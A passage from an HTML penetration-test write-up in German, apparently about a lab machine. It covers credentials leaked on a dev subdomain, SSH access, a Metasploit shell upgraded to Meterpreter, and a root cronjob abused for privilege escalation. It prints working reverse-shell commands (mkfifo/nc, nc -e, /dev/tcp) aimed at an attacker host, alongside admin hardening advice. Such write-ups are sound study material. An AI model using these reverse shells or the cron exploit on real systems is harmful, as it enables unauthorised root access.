+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Rufen Sie die gefundene Subdomain `http://dev.midnight.coffee` im Browser auf und untersuchen Sie deren Inhalt und Funktionalität gründlich. Führen Sie auch Web-Scanner (`nikto`, `gobuster`) gegen diese Subdomain aus.
+             <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Entwicklungs-Subdomains ordnungsgemäß gesichert sind (z.B. durch Authentifizierung, IP-Beschränkung) und nicht versehentlich über das öffentliche Netz erreichbar sind oder sensible Informationen enthalten.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Manual Browser Interaction]</div>
+                     <pre>
+# Zugriff auf: http://dev.midnight.coffee/index.html
+# Sichtbarer Inhalt auf der Seite:
+
+                       Midnight Coffee
+                 Developer Login Information
+
+        Developers can log in with the credentials:
+
+                   Username: developer
+                   Password: <span class="password">developer</span>
+
+   © 2024 Midnight Coffee. All rights reserved.
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Die zuvor entdeckte Subdomain `http://dev.midnight.coffee` wird im Browser aufgerufen. Die Seite zeigt explizit Login-Informationen an.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> **Kritischer Fund!** Die Entwicklerseite enthält hartcodierte Zugangsdaten: `developer` / `<span class="password">developer</span>`. Dies ist ein schwerwiegendes Sicherheitsrisiko.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, sich mit diesen Zugangsdaten (`developer`:`developer`) an anderer Stelle anzumelden, z.B. im Webshop-Login (`/shop/login.php`) oder per SSH. Suchen Sie nach einem Login-Formular auf der `dev.midnight.coffee`-Seite selbst.
+              <br><strong>Empfehlung (Admin):</strong> **KRITISCH!** Entfernen Sie sofort die hartcodierten Zugangsdaten von der Webseite. Implementieren Sie sichere Authentifizierungsmethoden. Überprüfen Sie den gesamten Code auf weitere hartcodierte Credentials. Sperren oder ändern Sie das `developer`-Konto.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Manual Browser Interaction after Login on dev.midnight.coffee]</div>
+                     <pre>
+# Nach erfolgreichem Login mit developer:developer auf http://dev.midnight.coffee:
+
+                        Midnight Coffee
+
+            Menu Location Contact Home
+
+Welcome to the Dashboard, developer!
+To login into the server use: tuna : <span class="password">1L0v3_TuN4_Very_Much</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Nach dem Login auf `http://dev.midnight.coffee` mit den zuvor gefundenen `developer`:`developer`-Zugangsdaten wird ein Dashboard angezeigt, das weitere Zugangsdaten preisgibt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Erneuter kritischer Fund und Initial Access!** Das Entwickler-Dashboard enthält Klartext-Zugangsdaten für einen Server-Login: `tuna` / `<span class="password">1L0v3_TuN4_Very_Much</span>`. Dies sind höchstwahrscheinlich die SSH-Zugangsdaten für das Zielsystem.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie sofort die Zugangsdaten `tuna`:`1L0v3_TuN4_Very_Much`, um sich per SSH (Port 22) am Zielsystem `192.168.2.107` anzumelden.
+             <br><strong>Empfehlung (Admin):</strong> **KRITISCH!** Entfernen Sie sofort die Zugangsdaten aus dem Dashboard. Ändern Sie das Passwort für den Benutzer `tuna`. Implementieren Sie sichere Methoden zur Verwaltung und Weitergabe von Zugangsdaten. Überprüfen Sie, welche Berechtigungen der `developer`-Benutzer hat und warum er Zugriff auf diese sensiblen Informationen hatte.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh tuna@192.168.2.107</span></div>
+                    <pre>
+The authenticity of host '192.168.2.107 (192.168.2.107)' can't be established.
+ED25519 key fingerprint is SHA256:BDdxu8eqrB8n8JfJ3LfRnnT0gGHmaYMEIA1SfgIR6g.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.2.107' (ED25519) to the list of known hosts.
+tuna@192.168.2.107's password: <span class="password">1L0v3_TuN4_Very_Much</span>
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri Apr 19 12:07:14 PM UTC 2024
+
+[...]
+
+Last login: Wed Jan  3 18:49:19 2024 from 10.0.2.8
+tuna@coffee-shop:~$
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, eine SSH-Verbindung zum Zielsystem `192.168.2.107` als Benutzer `tuna` mit dem auf der Entwicklerseite gefundenen Passwort `<span class="password">1L0v3_TuN4_Very_Much</span>` herzustellen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch, der Login war erfolgreich! Wir haben nun Shell-Zugriff auf das Zielsystem als Benutzer `tuna`. Die Initial-Access-Phase ist abgeschlossen. Der Hostname des Systems scheint `coffee-shop` zu sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginnen Sie mit der lokalen Enumeration als Benutzer `tuna`. Überprüfen Sie Rechte (`id`, `sudo -l`), suchen Sie nach Flags und sammeln Sie Informationen für die Privilege Escalation (SUID/GUID-Dateien, Cronjobs, Kernel-Version, etc.).
+            <br><strong>Empfehlung (Admin):</strong> Ändern Sie das kompromittierte Passwort für `tuna`. Analysieren Sie die Berechtigungen von `tuna`. Überprüfen Sie SSH-Logs.</p>
+        </section>
+
+         <section id="poc">
+             <h2>Proof of Concept (Privilege Escalation Path)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Nach Erlangung des initialen Zugriffs als Benutzer `tuna` wird nach Wegen zur Rechteerweiterung gesucht. Die Analyse der systemweiten Cronjobs (`/etc/crontab`) ist ein wichtiger Schritt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> In `/etc/crontab` wurde ein Eintrag gefunden, der minütlich (`* * * * *`) als Benutzer `root` das Skript `/home/shopadmin/execute.sh` ausführt. Die Analyse dieses Skripts (`cat /home/shopadmin/execute.sh`) zeigt, dass es einfach alle `.sh`-Dateien im Verzeichnis `/tmp` mittels `/bin/bash` ausführt (`/bin/bash /tmp/*.sh`). Da das `/tmp`-Verzeichnis normalerweise für alle Benutzer beschreibbar ist, kann der Benutzer `tuna` ein beliebiges Shell-Skript in `/tmp` platzieren (z.B. `payload.sh`), das dann innerhalb einer Minute mit `root`-Rechten ausgeführt wird. Dies stellt eine klare und einfache Privilege-Escalation-Möglichkeit dar.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Erstellen Sie ein Shell-Skript in `/tmp` (z.B. `/tmp/rev.sh`), das eine Reverse Shell zum Angreifersystem aufbaut oder `/bin/bash` SUID-Rechte verleiht. Warten Sie maximal eine Minute, bis der Cronjob das Skript ausführt.
+             <br><strong>Empfehlung (Admin):</strong> **KRITISCH!** Dieser Cronjob ist extrem gefährlich konfiguriert. Entfernen Sie diesen Cronjob sofort. Führen Sie niemals Skripte aus allgemein beschreibbaren Verzeichnissen wie `/tmp` mit `root`-Rechten aus. Wenn ein Cronjob benötigt wird, sollte er ein spezifisches Skript aus einem geschützten Verzeichnis ausführen, und die Berechtigungen dieses Skripts sollten sicher sein (nicht schreibbar für unprivilegierte Benutzer).</p>
+         </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">tuna@coffee-shop:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                     <pre>
+      297    129 -rwsr-xr-x   1 root     root       131832 May 27  2023 /snap/snapd/19457/usr/lib/snapd/snap-confine
+[...]
+      847     84 -rwsr-xr-x   1 root     root        85064 Nov 29  2022 /snap/core20/1974/usr/bin/chfn
+[...]
+     1141    163 -rwsr-xr-x   1 root     root       166056 Apr  4  2023 /snap/core20/1974/usr/bin/sudo
+[...]
+    10242    136 -rwsr-xr-x   1 root     root              138408 May 29  2023 /usr/lib/snapd/snap-confine
+     1411     36 -rwsr-xr--   1 root     messagebus         35112 ct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+    36883    332 -rwsr-xr-x   1 root     root              338536 Dec 18 16:28 /usr/lib/openssh/ssh-keysign
+[...]
+      898     32 -rwsr-xr-x   1 root     root               30872 Feb 26  2022 /usr/bin/pkexec
+[...]
+    13734     20 -rwsr-xr-x   1 root     root               18736 Feb 26  2022 /usr/libexec/polkit-agent-helper-1
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Suche nach Dateien mit gesetztem SUID-Bit im gesamten Dateisystem als Benutzer `tuna`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Liste enthält viele Standard-SUID-Dateien, darunter auch welche in `snap`-Verzeichnissen und `pkexec`. Es gibt keine offensichtlich ungewöhnlichen oder leicht ausnutzbaren benutzerdefinierten SUID-Binaries. `pkexec` hatte bekannte Schwachstellen (PwnKit), aber ob diese hier zutreffen, ist unklar und erfordert weitere Prüfung.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie die Version von `pkexec` auf die PwnKit-Schwachstelle (CVE-2021-4034). Da aber bereits ein einfacherer Weg über Cronjobs vermutet wird, sollte dieser priorisiert werden.
+             <br><strong>Empfehlung (Admin):</strong> Halten Sie das System aktuell, um bekannte Schwachstellen wie PwnKit zu patchen. Minimieren Sie die Anzahl der SUID-Dateien.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Befehl für Reverse Shell Versuch 1 (gescheitert) -->
+                     <div class="prompt">tuna@coffee-shop:~$ <span class="command">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.2.199 5555 >/tmp/f</span></div>
+                     <pre>
+rm: cannot remove '/tmp/f': No such file or directory
+                     </pre>
+                     <!-- Metasploit Handler Setup -->
+                     <div class="prompt metasploit-prompt">msf6 > <span class="command">use multi/handler</span></div>
+                     <pre>[*] Using configured payload generic/shell_reverse_tcp</pre>
+                     <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">set lhost eth0</span></div>
+                     <pre>lhost => 192.168.2.199</pre> <!-- IP aus Ausgabe übernommen -->
+                     <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">set lport 5555</span></div>
+                     <pre>lport => 5555</pre>
+                     <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">run</span></div>
+                     <pre>
+[*] Started reverse TCP handler on 192.168.2.199:5555
+                     </pre>
+                     <!-- Verbindung kommt an (von anderem Versuch?) -->
+                     <pre>
+[*] Command shell session 1 opened (192.168.2.199:5555 -> 192.168.2.107:50830) at 2024-04-19 14:11:18 +0200
+
+Shell Banner:
+$
+-----
+
+$ ^Z
+Background session 1? [y/N]  y
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, eine Reverse Shell vom Zielsystem (`tuna` Shell) zum Angreifersystem auf Port 5555 aufzubauen. Der erste Befehl (`rm /tmp/f...`) verwendet eine FIFO-Pipe (`mkfifo`), um eine interaktive Shell (`/bin/sh -i`) über `nc` (netcat) zu leiten. Dieser spezifische Befehl scheint fehlzuschlagen (`rm: cannot remove '/tmp/f': No such file or directory`). Parallel wird im Metasploit Framework (`msfconsole`) ein Handler (`multi/handler`) konfiguriert, um auf eingehende Verbindungen auf Port 5555 zu lauschen. Überraschenderweise wird eine Shell-Session (ID 1) geöffnet, obwohl der initiale `nc`-Befehl fehlschlug. Dies deutet darauf hin, dass die Verbindung möglicherweise durch einen anderen Mechanismus (vielleicht den Cronjob oder einen anderen Befehl) ausgelöst wurde.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Obwohl der explizit gezeigte Reverse-Shell-Befehl fehlschlug, wurde erfolgreich eine Reverse-Shell-Verbindung zum Metasploit-Handler hergestellt (Session 1). Dies gibt dem Angreifer eine weitere (möglicherweise stabilere) Shell auf dem Zielsystem als Benutzer `tuna`. Die Shell wird in den Hintergrund geschickt (`^Z`, `y`).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die bestehende Metasploit-Shell-Session (ID 1) für weitere Aktionen. Versuchen Sie, diese zu einer Meterpreter-Session aufzuwerten (`sessions -u 1` oder `use post/multi/manage/shell_to_meterpreter`), um mehr Funktionalität zu erhalten. Untersuchen Sie, wie die Verbindung zustande kam (wahrscheinlich der Cronjob).
+             <br><strong>Empfehlung (Admin):</strong> Überwachen Sie ausgehende Netzwerkverbindungen vom Server. Implementieren Sie Egress-Filtering in der Firewall, um unerwünschte ausgehende Verbindungen zu blockieren. Untersuchen Sie Systemprozesse und Cronjobs auf verdächtige Aktivitäten.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Versuch, Shell zu Meterpreter aufzuwerten -->
+                     <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">use post/manage/shell_to_meterpreter</span></div>
+                     <pre>
+[-] No results from search
+[-] Failed to load module: post/manage/shell_to_meterpreter
+                     </pre>
+                     <!-- Suche nach dem Modul -->
+                     <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">search shell to meterpreter</span></div>
+                     <pre>
+Matching Modules
+================
+
+   #    Name                                      Disclosure Date  Rank    Check  Description
+   -    ----                                      ---------------  ----    -----  -----------
+[...]
+   99   post/multi/manage/shell_to_meterpreter                     normal  No     Shell to Meterpreter Upgrade
+[...]
+                     </pre>
+                     <!-- Korrekter Modulaufruf und Konfiguration -->
+                     <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">use 99</span></div>
+                     <!-- Hinweis: Hier sollte use post/multi/manage/shell_to_meterpreter stehen, use 99 ist äquivalent -->
+                     <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">set session 1</span></div>
+                     <pre>session => 1</pre>
+                     <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">sessions -l</span></div>
+                     <pre>
+Active sessions
+===============
+
+  Id  Name  Type             Information            Connection
+  --  ----  ----             -----------            ----------
+  1         shell sparc/bsd  Shell Banner: $ -----  192.168.2.199:5555 -> 192.168.2.107:50830 (192.168.2.107)
+                     </pre>
+                     <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">set lhost eth0</span></div>
+                     <pre>lhost => 192.168.2.199</pre>
+                     <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">set lport 4445</span></div>
+                     <pre>lport => 4445</pre>
+                     <!-- Ausführung des Upgrade-Moduls -->
+                     <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">run</span></div>
+                     <pre>
+[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 192.168.2.199:4445
+[*] Sending stage (1017704 bytes) to 192.168.2.107
+[*] Meterpreter session 2 opened (192.168.2.199:4445 -> 192.168.2.107:35406) at 2024-04-19 14:14:32 +0200
+[*] Command stager progress: 100.00% (773/773 bytes)
+[*] Post module execution completed
+                     </pre>
+                     <!-- Überprüfung der Sessions -->
+                     <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">sessions -l</span></div>
+                     <pre>
+Active sessions
+===============
+
+  Id  Name  Type                   Information            Connection
+  --  ----  ----                   -----------            ----------
+  1         shell sparc/bsd        Shell Banner: $ -----  192.168.2.199:5555 -> 192.168.2.107:50830 (192.168.2.107)
+  2         meterpreter x86/linux  tuna @ 192.168.2.107   192.168.2.199:4445 -> 192.168.2.107:35406 (192.168.2.107)
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, die bestehende Shell-Session (ID 1) in eine funktionsreichere Meterpreter-Session umzuwandeln. Zuerst gibt es einen Fehler beim Laden des Moduls (`post/manage/shell_to_meterpreter`), möglicherweise ein Tippfehler. Nach einer Suche (`search shell to meterpreter`) wird das korrekte Modul (Index 99) gefunden und verwendet. Die Session ID 1 wird als Ziel ausgewählt, und ein neuer Listener auf Port 4445 wird konfiguriert. Das Modul wird ausgeführt (`run`).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Upgrade war erfolgreich! Das Modul lädt den Meterpreter-Stager auf das Zielsystem hoch und führt ihn aus, was zu einer neuen Meterpreter-Session (ID 2) führt, die sich zurück zum Listener auf Port 4445 verbindet. Die alte Shell-Session (ID 1) bleibt ebenfalls aktiv. Eine Meterpreter-Session bietet erweiterte Möglichkeiten zur Interaktion mit dem Zielsystem.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Interagieren Sie mit der neuen Meterpreter-Session (`sessions -i 2`). Nutzen Sie Meterpreter-Befehle zur weiteren Enumeration (z.B. `sysinfo`, `getuid`, `ps`, `ls`, `download`, `upload`). Fahren Sie mit der Suche nach dem Privilege-Escalation-Vektor (Cronjob) fort.
+             <br><strong>Empfehlung (Admin):</strong> Die gleichen Empfehlungen wie beim vorherigen Reverse-Shell-Schritt gelten. Zusätzlich kann die Erkennung von Meterpreter-Payloads durch Antiviren-Software oder Endpoint Detection and Response (EDR)-Systeme verbessert werden.</p>
+
+            <!-- Weitere Enumerationsschritte aus der 'tuna' Shell -->
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Überprüfung von /etc/passwd (redundant, aber im Text) -->
+                     <div class="prompt">tuna@coffee-shop:~$ <span class="command">grep bash /etc/passwd</span></div>
+                     <pre>
+root:x:0:0:root:/root:/bin/bash
+mrmidnight:x:1000:1000:mrmidnight:/home/mrmidnight:/bin/bash
+shopadmin:x:1001:1001:,,,:/home/shopadmin:/bin/bash
+tuna:x:1002:1002:,,,:/home/tuna:/bin/bash
+                     </pre>
+                     <!-- Versuche, auf andere Home-Verzeichnisse zuzugreifen -->
+                     <div class="prompt">tuna@coffee-shop:~$ <span class="command">ls -la /home/shopadmin</span></div>
+                     <pre>ls: cannot open directory '.': Permission denied</pre>
+                     <div class="prompt">tuna@coffee-shop:~$ <span class="command">cd ../mrmidnight/</span></div>
+                     <pre>-bash: cd: ../mrmidnight/: Permission denied</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird erneut `/etc/passwd` überprüft (zeigt die gleichen Benutzer wie zuvor). Anschließend wird versucht, auf die Home-Verzeichnisse anderer Benutzer (`shopadmin`, `mrmidnight`) zuzugreifen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Zugriff auf die Home-Verzeichnisse anderer Benutzer wird verweigert ("Permission denied"). Dies ist eine Standard-Sicherheitskonfiguration unter Linux, bei der Home-Verzeichnisse normalerweise nur für den jeweiligen Benutzer zugänglich sind.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Zugriff auf andere Benutzerverzeichnisse ist nicht direkt möglich. Konzentrieren Sie sich auf systemweite Konfigurationen und den Cronjob-Vektor.
+             <br><strong>Empfehlung (Admin):</strong> Die Berechtigungen für Home-Verzeichnisse sind korrekt und sollten beibehalten werden (`rwx------` oder `700`).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Überprüfung der Netzwerk-Sockets (redundant, aber im Text) -->
+                     <div class="prompt">tuna@coffee-shop:/var/www/html/subdomaindeveloperdirectoryuwu/dev$ <span class="command">ss -altpn</span></div>
+                     <pre>
+State     Recv-Q    Send-Q        Local Address:Port          Peer Address:Port    Process
+LISTEN    0         70                127.0.0.1:33060              0.0.0.0:*        users:(("mysqld",pid=486,fd=31))
+LISTEN    0         151               127.0.0.1:3306               0.0.0.0:*        users:(("mariadbd",pid=525,fd=18))
+LISTEN    0         4096          127.0.0.53%lo:53                 0.0.0.0:*        users:(("systemd-resolve",pid=438,fd=13))
+LISTEN    0         128                 0.0.0.0:22                 0.0.0.0:*        users:(("sshd",pid=485,fd=3))
+LISTEN    0         511                       *:80                       *:*        users:(("apache2",pid=610,fd=4),("apache2",pid=609,fd=4),("apache2",pid=532,fd=4))
+LISTEN    0         128                    [::]:22                    [::]:*        users:(("sshd",pid=485,fd=4))
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Erneute Überprüfung der lauschenden TCP-Ports mit `ss -altpn`.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe zeigt die gleichen Dienste wie zuvor, aber mit einem Unterschied: MySQL/MariaDB (Port 3306) und MySQL X (Port 33060) lauschen jetzt nur noch auf `127.0.0.1` (localhost). Das bedeutet, dass von außen (wie beim initialen `nmap`-Scan) kein Zugriff mehr möglich wäre. Der DNS-Dienst (`systemd-resolve`) auf Port 53 lauscht ebenfalls nur lokal. SSH (22) und HTTP (80) lauschen weiterhin auf allen Interfaces.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Datenbanken sind nur lokal erreichbar. Der Zugriff muss über die Shell oder eine Webanwendung erfolgen.
+              <br><strong>Empfehlung (Admin):</strong> Die Konfiguration, Datenbankdienste nur an localhost zu binden, ist eine gute Sicherheitspraxis, wenn keine externen Verbindungen benötigt werden.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Erneuter MySQL Login Versuch (redundant) -->
+                     <div class="prompt">tuna@coffee-shop:/var/www/html/subdomaindeveloperdirectoryuwu/dev$ <span class="command">mysql -u tuna -p</span></div>
+                     <pre>
+Enter password: <span class="password">1L0v3_TuN4_Very_Much</span>
+ERROR 1045 (28000): Access denied for user 'tuna'@'localhost' (using password: YES)
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Erneuter Versuch, sich an der lokalen MySQL-Datenbank als Benutzer `tuna` mit dessen SSH-Passwort anzumelden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Schlägt wie erwartet fehl ("Access denied"). Der Benutzer `tuna` hat kein Datenbankkonto oder verwendet ein anderes Passwort.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, die in der `wp-config.php` gefundenen Zugangsdaten (falls vorhanden) oder die aus der Datenbankabfrage (`shopadmin`:`1_4m_4dmin`, `developer`:`developer`) für den MySQL-Login zu verwenden.
+             <br><strong>Empfehlung (Admin):</strong> Verwenden Sie separate, starke Passwörter für System- und Datenbankkonten.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Erneute Überprüfung von Capabilities (redundant) -->
+                     <div class="prompt">tuna@coffee-shop:/var/www/html/subdomaindeveloperdirectoryuwu/dev$ <span class="command">getcap -r / 2>/dev/null</span></div>
+                     <pre>
+/snap/core20/1974/usr/bin/ping cap_net_raw=ep
+/snap/core20/2105/usr/bin/ping cap_net_raw=ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
+/usr/bin/ping cap_net_raw=ep
+/usr/bin/mtr-packet cap_net_raw=ep
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Erneute Suche nach Dateien mit gesetzten Linux Capabilities.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe zeigt einige Standard-Capabilities für `ping`, `mtr-packet` und einen GStreamer-Helper. Keine dieser Capabilities stellt einen offensichtlichen Vektor für Privilege Escalation dar.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Capabilities scheinen hier kein Weg zur Rechteerweiterung zu sein. Konzentrieren Sie sich auf den Cronjob.
+             <br><strong>Empfehlung (Admin):</strong> Vergeben Sie Capabilities sparsam und nur wenn notwendig.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Überprüfung von /etc/crontab -->
+                     <div class="prompt">tuna@coffee-shop:/var/www/html/subdomaindeveloperdirectoryuwu/dev$ <span class="command">cat /etc/crontab</span></div>
+                     <pre>
+[...]
+# *  *  *  *  * user-name command to be executed
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * * root /bin/bash /home/shopadmin/execute.sh
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Der Inhalt der systemweiten Crontab (`/etc/crontab`) wird angezeigt.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Bestätigt den zuvor identifizierten kritischen Cronjob: Jede Minute (`* * * * *`) wird als `root` der Befehl `/bin/bash /home/shopadmin/execute.sh` ausgeführt.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie das Skript `/home/shopadmin/execute.sh`, um zu sehen, was es tut.
+              <br><strong>Empfehlung (Admin):</strong> Entfernen oder korrigieren Sie diesen gefährlichen Cronjob.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Untersuchung des Cron-Skripts -->
+                     <div class="prompt">tuna@coffee-shop:/var/www/html/subdomaindeveloperdirectoryuwu/dev$ <span class="command">cat /home/shopadmin/execute.sh</span></div>
+                     <pre>
+#!/bin/bash
+
+/bin/bash /tmp/*.sh
+                     </pre>
+                     <!-- Überprüfung der Berechtigungen des Cron-Skripts -->
+                     <div class="prompt">tuna@coffee-shop:/var/www/html/subdomaindeveloperdirectoryuwu/dev$ <span class="command">ls -la /home/shopadmin/execute.sh</span></div>
+                     <pre>
+-rwxrwxr-x 1 shopadmin shopadmin 33 Jan  3 18:37 /home/shopadmin/execute.sh
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt des Cron-Skripts `/home/shopadmin/execute.sh` wird angezeigt. Es führt einfach alle Dateien mit der Endung `.sh` im Verzeichnis `/tmp` mittels `/bin/bash` aus. Anschließend werden die Berechtigungen des Skripts selbst überprüft.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Skript bestätigt die Schwachstelle: Es führt blind alle `.sh`-Dateien in `/tmp` aus. Das `/tmp`-Verzeichnis ist typischerweise für alle Benutzer beschreibbar. Die Berechtigungen des Skripts `execute.sh` selbst sind `-rwxrwxr-x`, was bedeutet, dass es für den Eigentümer (`shopadmin`), die Gruppe (`shopadmin`) und andere (`others`) lesbar, schreibbar und ausführbar ist. Dass es "world-writable" ist, ist ein zusätzliches, aber für diesen Exploit nicht direkt notwendiges Problem, da der Benutzer `tuna` ohnehin Schreibrechte in `/tmp` hat. Der entscheidende Punkt ist, dass `root` dieses Skript ausführt, welches wiederum Inhalte aus `/tmp` ausführt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Erstellen Sie eine Datei mit der Endung `.sh` im `/tmp`-Verzeichnis (z.B. `/tmp/payload.sh`), die den gewünschten Code enthält (z.B. eine Reverse Shell). Machen Sie die Datei ausführbar (`chmod +x /tmp/payload.sh`). Warten Sie bis zu einer Minute, bis der Cronjob sie als `root` ausführt.
+             <br><strong>Empfehlung (Admin):</strong> **KRITISCH!** Korrigieren Sie den Cronjob und das Skript. Führen Sie niemals Inhalte aus `/tmp` oder anderen gemeinsam beschreibbaren Verzeichnissen als `root` aus. Ändern Sie die Berechtigungen von `/home/shopadmin/execute.sh` auf etwas Sichereres (z.B. `-rwx------`, nur für `shopadmin` les-/schreib-/ausführbar, obwohl das Skript selbst unsicher ist und entfernt werden sollte).</p>
+
+             <!-- Erster Payload-Versuch für Cronjob -->
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">tuna@coffee-shop:/tmp$ <span class="command">echo 'nc -e /bin/bash 192.168.2.199 5552"' > exe.sh</span></div>
+                     <!-- Hinweis: Das schließende Anführungszeichen ist wahrscheinlich ein Fehler -->
+                     <div class="prompt">tuna@coffee-shop:/tmp$ <span class="command">chmod +x exe.sh</span></div>
+                     <!-- Kein Output -->
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, ein Payload-Skript `/tmp/exe.sh` zu erstellen. Es soll `netcat` (`nc`) verwenden, um eine Shell (`-e /bin/bash`) zurück zum Angreifer (`192.168.2.199`) auf Port `5552` zu verbinden. Anschließend wird das Skript ausführbar gemacht.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein korrekter Ansatz zur Ausnutzung des Cronjobs. Wenn der Cronjob `/bin/bash /tmp/exe.sh` ausführt, sollte eine Root-Reverse-Shell aufgebaut werden. **Achtung:** Das zusätzliche Anführungszeichen am Ende des `echo`-Befehls (`5552"`) ist wahrscheinlich ein Tippfehler und könnte die Ausführung verhindern. Der `-e` Parameter von `nc` ist zudem nicht auf allen Systemen verfügbar.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Korrigieren Sie das überflüssige Anführungszeichen im `echo`-Befehl. Verwenden Sie robustere Reverse-Shell-Payloads, falls `nc -e` nicht funktioniert (z.B. `bash -i >& /dev/tcp/IP/PORT 0>&1` oder Python/Perl/Ruby-Payloads). Stellen Sie sicher, dass auf dem Angreifersystem ein Listener auf Port 5552 läuft (`nc -lvnp 5552`).
+             <br><strong>Empfehlung (Admin):</strong> Entfernen Sie den Cronjob und das unsichere Skript.</p>
+
+            <!-- Zweiter Payload-Versuch für Cronjob -->
+            <div class="code-block">
+                 <div class="terminal">
